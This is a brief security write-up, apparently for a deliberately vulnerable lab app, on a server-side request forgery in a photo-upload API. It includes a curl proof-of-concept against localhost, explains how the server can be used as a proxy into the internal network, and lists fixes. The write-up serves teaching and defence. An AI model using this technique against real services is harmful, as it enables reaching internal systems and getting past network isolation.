# Server-Side Request Forgery

Main page is <url>/gallery, where `<url>` is `localhost:8000` by default

## Exploit

upload photo

```bash
curl 'http://127.0.0.1:8000/api/photo_upload' -X POST \
-H 'Accept: image/avif,image/webp,*/*' \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Referer: http://127.0.0.1:8000/api/photo_upload' \
-H 'DNT: 1' \
-H 'Connection: keep-alive' \
-H 'Sec-Fetch-Dest: image' \
-H 'Sec-Fetch-Mode: no-cors' \
-H 'Sec-Fetch-Site: same-origin' \
-H 'Sec-GPC: 1' \
-H 'Content-Type: application/json' \
-H 'Origin: http://127.0.0.1:8000' \
-H 'Pragma: no-cache' \
-H 'Cache-Control: no-cache' \
--data-raw '{"url":"https://foundation.rust-lang.org/img/cargo.png"}'
```

The server does not handle any MIME type or anything. You can ask it to request
something from the local network, and it will do that. Additionally, the
downloaded file will be available via the link below. Therefore, it could be
used to bypass intra-network isolation and serve as a proxy for limited GET
requests.

The file can now be accessed via similar link:
`http://127.0.0.1:8000/content/fb2f15c8-d92f-43c4-b752-773d82f39c56.jpg`

## Fixes

- Add validation for response MIME type
- Implement a strict policy to deny any access to the internal network, as the service does not require it
- Place the server behind a filtering proxy that drops all packages with suspicious requests. For instance, Nginx offers various configurations for this purpose
- Ensure the clarity of GET parameters, as they represent a significant attack surface

## References

- [Definition at owasp.org](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
